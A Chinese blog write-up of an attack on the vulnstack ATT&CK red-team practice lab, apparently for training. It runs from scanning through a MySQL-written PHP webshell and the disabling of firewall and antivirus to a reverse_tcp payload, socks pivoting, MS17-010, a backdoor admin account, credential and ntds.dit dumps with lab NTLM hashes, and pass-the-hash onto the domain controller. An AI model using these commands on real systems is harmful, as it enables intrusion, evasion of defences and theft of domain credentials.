date: 2020-02-17
categories:
- 靶场
tags:
- 内网渗透
- 靶场
- 域渗透
title: vulnstackATT&CK红队评估靶场1渗透记录
---
# vulnstackATT&CK红队评估靶场1渗透记录

## 主机发现

已知靶机在192.168.2.*上

```

[*] Nmap: Nmap scan report for stu1.lan (192.168.2.142)
[*] Nmap: Nmap scan report for kali.lan (192.168.2.158)
```

目标就是192.168.2.142

## 端口扫描

```
[*] Nmap: Starting Nmap 7.80 ( https://nmap.org ) at 2020-02-16 10:48 CST
[*] Nmap: Stats: 0:03:23 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan
[*] Nmap: SYN Stealth Scan Timing: About 54.92% done; ETC: 10:54 (0:02:47 remaining)
[*] Nmap: Stats: 0:03:23 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan
[*] Nmap: SYN Stealth Scan Timing: About 54.97% done; ETC: 10:54 (0:02:47 remaining)
[*] Nmap: Stats: 0:04:40 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan
[*] Nmap: SYN Stealth Scan Timing: About 75.24% done; ETC: 10:54 (0:01:32 remaining)
[*] Nmap: Nmap scan report for stu1.lan (192.168.2.142)
[*] Nmap: Host is up (0.00062s latency).
[*] Nmap: Not shown: 65523 closed ports
[*] Nmap: PORT     STATE SERVICE
[*] Nmap: 80/tcp   open  http
[*] Nmap: 135/tcp  open  msrpc
[*] Nmap: 139/tcp  open  netbios-ssn
[*] Nmap: 445/tcp  open  microsoft-ds
[*] Nmap: 1025/tcp open  NFS-or-IIS
[*] Nmap: 1026/tcp open  LSA-or-nterm
[*] Nmap: 1027/tcp open  IIS
[*] Nmap: 1028/tcp open  unknown
[*] Nmap: 1029/tcp open  ms-lsa
[*] Nmap: 1030/tcp open  iad1
[*] Nmap: 3306/tcp open  mysql
[*] Nmap: 3389/tcp open  ms-wbt-server
[*] Nmap: MAC Address: 00:0C:29:A7:C1:B2 (VMware)

```



## web服务



先去看看web服务吧

```
[10:52:41] 200 -   11B  - /index.php
[10:52:45] 200 -   71KB - /phpinfo.php
[10:52:45] 200 -    4KB - /phpMyAdmin/
[10:52:53] 200 -    2B  - /1.php
```

看了一下只有phpmyadmin有用

试着弱密码登陆,不直接用mysql客户端登陆是因为怕他们禁止远程ip

网上随便找了一个爆破phpmyadmin的

![image1782](https://i.loli.net/2020/02/16/vIQt8APEoGW7aKT.png)



弱密码登陆成功

尝试sql写shell

```
1. select "test" into outfile "C:/phpStudy/WWW/test.php";
2. 日志写shell
mysql> show variables like '%general%'#先看下当前mysql默认的日志位置在什么地方,'C:\phpStudy\MySQL\data\stu1.log' 顺手把原来正常的日志路径稍微记录下,等会儿干完活儿再把它恢复回来
mysql> set global general_log = on#默认基本都是关闭的,不然这个增删改查的记录量可能会非常大
mysql>  set global general_log_file = 'C:/phpStudy/WWW/test.php';#此时,再把原本的日志文件位置指向到目标网站的物理路径
mysql> select '<?php eval($_POST[request]);?>'#开始写shell,这里就是个普通的shell,不免杀,如果有waf的话,可以用下面的免杀shell


##写完之后记得恢复
mysql> set global general_log_file = 'C:\phpStudy\MySQL\data\stu1.log';
mysql> set global general_log = off;
```



![image2457](https://i.loli.net/2020/02/16/fUuoVKeY1BMhNXm.png)

成功写入shell



![image2535](https://i.loli.net/2020/02/16/TKF1n7r5Am2cfBj.png)



直接拿到管理员权限了



## meterpreter后攻击

```
netsh advfirewall set allprofiles state off#关闭防火墙
net stop windefend
netsh firewall set opmode mode=disable
bcdedit.exe /set{current} nx AlwaysOff#关闭DEP
meterpreter > run killav  关闭杀毒软件 
```





## 设置代理

```
msfvenom -p php/meterpreter/reverse_tcp -a php -f raw > /tmp/2.php
use exploit/multi/handler
set payload php/meterpreter/reverse_tcp
show options
run autoroute -s 192.168.52.143
msf > use auxiliary/server/socks4a   设置socks4代理模块
msf auxiliary(socks4a) > show options 
msf auxiliary(socks4a) > run
vim /etc/proxychains.conf   修改代理监听端口,和前面端口一致

```



用msf设置的代理不知道为啥不太稳定

于是我用reGeorg来设置代理

emmmm,还是ew好用



## 内网渗透

因为socks无法代理icmp协议(ping使用的),所以namp要用`-Pn`选项

```
Starting Nmap 7.80 ( https://nmap.org ) at 2020-02-16 13:50 ?D1��������?����??
Nmap scan report for 192.168.52.138
Host is up (0.00s latency).
MAC Address: 00:0C:29:3F:5D:A9 (VMware)
Nmap scan report for 192.168.52.141
Host is up (0.00s latency).
MAC Address: 00:0C:29:6D:39:34 (VMware)
Nmap scan report for www.qiyuanxuetang.net (192.168.52.143)
Host is up.
Nmap done: 256 IP addresses (3 hosts up) scanned in 5.01 seconds

```

接下来的目标是`192.168.52.138`,`192.168.52.141`



192.168.52.138

```
Starting Nmap 7.80 ( https://nmap.org ) at 2020-02-16 13:57 ?D1��������?����??
Nmap scan report for 192.168.52.138
Host is up (0.00031s latency).
Not shown: 983 filtered ports
PORT      STATE SERVICE
53/tcp    open  domain
80/tcp    open  http
88/tcp    open  kerberos-sec
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
389/tcp   open  ldap
445/tcp   open  microsoft-ds
464/tcp   open  kpasswd5
593/tcp   open  http-rpc-epmap
636/tcp   open  ldapssl
3268/tcp  open  globalcatLDAP
3269/tcp  open  globalcatLDAPssl
MAC Address: 00:0C:29:3F:5D:A9 (VMware)

Nmap done: 1 IP address (1 host up) scanned in 5.04 seconds
```

Running: Microsoft Windows 7|8|Vista|2008



192.168.52.141

```
21/tcp   open  ftp
135/tcp  open  msrpc
139/tcp  open  netbios-ssn
445/tcp  open  microsoft-ds
777/tcp  open  multiling-http
1025/tcp open  NFS-or-IIS
1026/tcp open  LSA-or-nterm
1030/tcp open  iad1
1031/tcp open  iad2
6002/tcp open  X11:2
7001/tcp open  afs3-callback
7002/tcp open  afs3-prserver
8099/tcp open  unknown
```

Running: Microsoft Windows XP|2003

弱密码登陆ftp,发现啥也弄不了动不动500

因为操作系统比较旧,可以试试MS17-010,成功!

但是只有ms17_010_command才利用成功,只能一次一次set command来执行命令

后来找到`cmd/windows/powershell_bind_tcp`

能直接返回一个powershell

添加用户

```
net user ccreater Abc1234 /add
net localgroup administrators ccreater /add
REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal" "Server /v fDenyTSConnections /t REG_DWORD /d 0 /f
```



## 域控

```
net group "domain controllers" /domain 
得到域控制器主机名:OWA
wmic qfe 
查询安装补丁
http://support.microsoft.com/?kbid=976902  OWA     Update                    KB976902               GOD\Administrator  11/21/2010 

net user /domain
查询域所有用户
-------------------------------------------------------------------------------
Administrator            gqy                      Guest                    
krbtgt                   ligang                   liukaifeng01   

```

没有安装kb3011780,可以将任何一个域用户提权至域管理员权限

域控的ip是:`192.168.52.138`



```
Authentication Id : 0 ; 996 (00000000:000003e4)
Domain : GOD / S-1-5-21-2952760202-1353902439-2381784089
Session           : Service from 0
User Name         : OWA$
Domain            : GOD
Logon Server      : (null)
Logon Time        : 2020/2/16 20:59:23
SID               : S-1-5-20
	msv :	
	 [00000003] Primary
	 * Username : OWA$
	 * Domain   : GOD
	 * NTLM     : f8ddc71a57488df64708651271185969
	 * SHA1     : 93d8566dd8e60d8a6bf47d86fd8c1d47a82bacdf
	tspkg :	
	wdigest :	
	 * Username : OWA$
	 * Domain   : GOD
	 * Password : 03 eb 3e 5e bb 37 5d 2d a7 1c c3 e8 c2 10 2f 82 95 04 cf 25 e8 fb c2 be 28 71 04 c9 5a 22 11 36 2c 07 b3 f1 83 45 67 70 b7 2b 2c 89 44 76 e6 b9 5f 50 79 31 d6 8b a4 6e fb 28 2f bf c8 14 ee e6 c0 00 9f 5c f2 28 26 ef 97 99 74 5e 8a c2 10 86 0e ad 05 05 08 7c 8e ec e7 49 e9 eb df a6 80 2a c7 43 1c 27 6c cf 76 ff 89 ec 03 ed b2 c7 79 45 36 97 31 20 db c8 b3 2d 6f cb d5 53 d2 a1 e0 e7 18 86 94 2e c2 a8 8e 46 4c 54 01 dd 30 c5 0d 7e ce de 7e b5 ff a1 6b e5 34 a6 c2 dc 0d 57 0f 99 1b bf e1 49 a2 92 37 19 76 df 97 eb 5f 52 7c 21 ae 93 e3 5e ed 2d 87 17 6c f9 e2 12 9a d9 32 a3 33 a2 3b 8f 6d 38 f7 7b fb b5 bb 3b cb 1a 93 7a 98 e3 b9 60 ed 5d 74 89 1b d0 d0 90 56 54 7f 02 93 72 8a da 03 e8 cc f6 1b e0 be 0f 54 3e 57 65 
	kerberos :	
	 * Username : owa$
	 * Domain   : GOD.ORG
	 * Password : 03 eb 3e 5e bb 37 5d 2d a7 1c c3 e8 c2 10 2f 82 95 04 cf 25 e8 fb c2 be 28 71 04 c9 5a 22 11 36 2c 07 b3 f1 83 45 67 70 b7 2b 2c 89 44 76 e6 b9 5f 50 79 31 d6 8b a4 6e fb 28 2f bf c8 14 ee e6 c0 00 9f 5c f2 28 26 ef 97 99 74 5e 8a c2 10 86 0e ad 05 05 08 7c 8e ec e7 49 e9 eb df a6 80 2a c7 43 1c 27 6c cf 76 ff 89 ec 03 ed b2 c7 79 45 36 97 31 20 db c8 b3 2d 6f cb d5 53 d2 a1 e0 e7 18 86 94 2e c2 a8 8e 46 4c 54 01 dd 30 c5 0d 7e ce de 7e b5 ff a1 6b e5 34 a6 c2 dc 0d 57 0f 99 1b bf e1 49 a2 92 37 19 76 df 97 eb 5f 52 7c 21 ae 93 e3 5e ed 2d 87 17 6c f9 e2 12 9a d9 32 a3 33 a2 3b 8f 6d 38 f7 7b fb b5 bb 3b cb 1a 93 7a 98 e3 b9 60 ed 5d 74 89 1b d0 d0 90 56 54 7f 02 93 72 8a da 03 e8 cc f6 1b e0 be 0f 54 3e 57 65 
	ssp :	
	credman :	

Authentication Id : 0 ; 47752 (00000000:0000ba88)
Session           : UndefinedLogonType from 0
User Name         : (null)
Domain            : (null)
Logon Server      : (null)
Logon Time        : 2020/2/16 20:59:18
SID               : 
	msv :	
	 [00000003] Primary
	 * Username : OWA$
	 * Domain   : GOD
	 * NTLM     : f8ddc71a57488df64708651271185969
	 * SHA1     : 93d8566dd8e60d8a6bf47d86fd8c1d47a82bacdf
	 * NTLM     : f8ddc71a57488df64708651271185969:93d8566dd8e60d8a6bf47d86fd8c1d47a82bacdf
	tspkg :	
	wdigest :	
	kerberos :	
	ssp :	
	credman :	

Authentication Id : 0 ; 995 (00000000:000003e3)
Session           : Service from 0
User Name         : IUSR
Domain            : NT AUTHORITY
Logon Server      : (null)
Logon Time        : 2020/2/16 21:00:06
SID               : S-1-5-17
	msv :	
	tspkg :	
	wdigest :	
	 * Username : (null)
	 * Domain   : (null)
	 * Password : (null)
	kerberos :	
	ssp :	
	credman :	

Authentication Id : 0 ; 997 (00000000:000003e5)
Session           : Service from 0
User Name         : LOCAL SERVICE
Domain            : NT AUTHORITY
Logon Server      : (null)
Logon Time        : 2020/2/16 20:59:23
SID               : S-1-5-19
	msv :	
	tspkg :	
	wdigest :	
	 * Username : (null)
	 * Domain   : (null)
	 * Password : (null)
	kerberos :	
	 * Username : (null)
	 * Domain   : (null)
	 * Password : (null)
	ssp :	
	credman :	

Authentication Id : 0 ; 999 (00000000:000003e7)
Session           : UndefinedLogonType from 0
User Name         : OWA$
Domain            : GOD
Logon Server      : (null)
Logon Time        : 2020/2/16 20:59:17
SID               : S-1-5-18
	msv :	
	tspkg :	
	wdigest :	
	 * Username : OWA$
	 * Domain   : GOD
	 * Password : 03 eb 3e 5e bb 37 5d 2d a7 1c c3 e8 c2 10 2f 82 95 04 cf 25 e8 fb c2 be 28 71 04 c9 5a 22 11 36 2c 07 b3 f1 83 45 67 70 b7 2b 2c 89 44 76 e6 b9 5f 50 79 31 d6 8b a4 6e fb 28 2f bf c8 14 ee e6 c0 00 9f 5c f2 28 26 ef 97 99 74 5e 8a c2 10 86 0e ad 05 05 08 7c 8e ec e7 49 e9 eb df a6 80 2a c7 43 1c 27 6c cf 76 ff 89 ec 03 ed b2 c7 79 45 36 97 31 20 db c8 b3 2d 6f cb d5 53 d2 a1 e0 e7 18 86 94 2e c2 a8 8e 46 4c 54 01 dd 30 c5 0d 7e ce de 7e b5 ff a1 6b e5 34 a6 c2 dc 0d 57 0f 99 1b bf e1 49 a2 92 37 19 76 df 97 eb 5f 52 7c 21 ae 93 e3 5e ed 2d 87 17 6c f9 e2 12 9a d9 32 a3 33 a2 3b 8f 6d 38 f7 7b fb b5 bb 3b cb 1a 93 7a 98 e3 b9 60 ed 5d 74 89 1b d0 d0 90 56 54 7f 02 93 72 8a da 03 e8 cc f6 1b e0 be 0f 54 3e 57 65 
	kerberos :	
	 * Username : owa$
	 * Domain   : GOD.ORG
	 * Password : 03 eb 3e 5e bb 37 5d 2d a7 1c c3 e8 c2 10 2f 82 95 04 cf 25 e8 fb c2 be 28 71 04 c9 5a 22 11 36 2c 07 b3 f1 83 45 67 70 b7 2b 2c 89 44 76 e6 b9 5f 50 79 31 d6 8b a4 6e fb 28 2f bf c8 14 ee e6 c0 00 9f 5c f2 28 26 ef 97 99 74 5e 8a c2 10 86 0e ad 05 05 08 7c 8e ec e7 49 e9 eb df a6 80 2a c7 43 1c 27 6c cf 76 ff 89 ec 03 ed b2 c7 79 45 36 97 31 20 db c8 b3 2d 6f cb d5 53 d2 a1 e0 e7 18 86 94 2e c2 a8 8e 46 4c 54 01 dd 30 c5 0d 7e ce de 7e b5 ff a1 6b e5 34 a6 c2 dc 0d 57 0f 99 1b bf e1 49 a2 92 37 19 76 df 97 eb 5f 52 7c 21 ae 93 e3 5e ed 2d 87 17 6c f9 e2 12 9a d9 32 a3 33 a2 3b 8f 6d 38 f7 7b fb b5 bb 3b cb 1a 93 7a 98 e3 b9 60 ed 5d 74 89 1b d0 d0 90 56 54 7f 02 93 72 8a da 03 e8 cc f6 1b e0 be 0f 54 3e 57 65 
	ssp :	
	credman :	
** SAM ACCOUNT **

SAM Username         : krbtgt
Object Security ID   : S-1-5-21-2952760202-1353902439-2381784089-502
Object Relative ID   : 502

Credentials:
  Hash NTLM: 58e91a5ac358d86513ab224312314061

Object RDN           : Read-only Domain Controllers

** SAM ACCOUNT **

SAM Username         : Administrator
Object Security ID   : S-1-5-21-2952760202-1353902439-2381784089-500
Object Relative ID   : 500

Credentials:
  Hash NTLM: a45a7246dd74b64a67f22fd7020f1bd8

Object RDN           : Administrators


502	krbtgt	58e91a5ac358d86513ab224312314061
1106	ligang	1e3d22f88dfd250c9312d21686c60f41
1107	DEV1$	bed18e5b9d13bb384a3041a10d43c01b
1104	ROOT-TVI862UBEH$	5604267003351107febdc6ed4e2dfdce
1105	STU1$	cb45e05d22e8106184056e55ac541149
500	Administrator	a45a7246dd74b64a67f22fd7020f1bd8
1001	OWA$	f8ddc71a57488df64708651271185969
1108	gqy	aa3afe73b6e0c2d87b3a428bf696ae71
1000	liukaifeng01	a45a7246dd74b64a67f22fd7020f1bd8

```

可惜没有明文密码

利用pth登陆Administrator

先导出system 和 NTDS.dit

```
ntdsutil "ac i ntds" ifm "create full c:\users\tmp" q q

NTDSDumpEx -d ntds.dit -s system -o domain.txt
得到hash
Administrator:500:aad3b435b51404eeaad3b435b51404ee:a45a7246dd74b64a67f22fd7020f1bd8:::
```

用msf上的`exploit/windows/smb/psexec`来进行pth攻击

```
use exploit/windows/smb/psexec
set payload windows/meterpreter/bind_tcp
set rhost xxx
set lport xxx
set rhosts 192.168.52.138
set smbuser Administrator
set smbpass aad3b435b51404eeaad3b435b51404ee:a45a7246dd74b64a67f22fd7020f1bd8
```

![image12506](https://i.loli.net/2020/02/17/9oLDYlWv5GBwOUN.png)

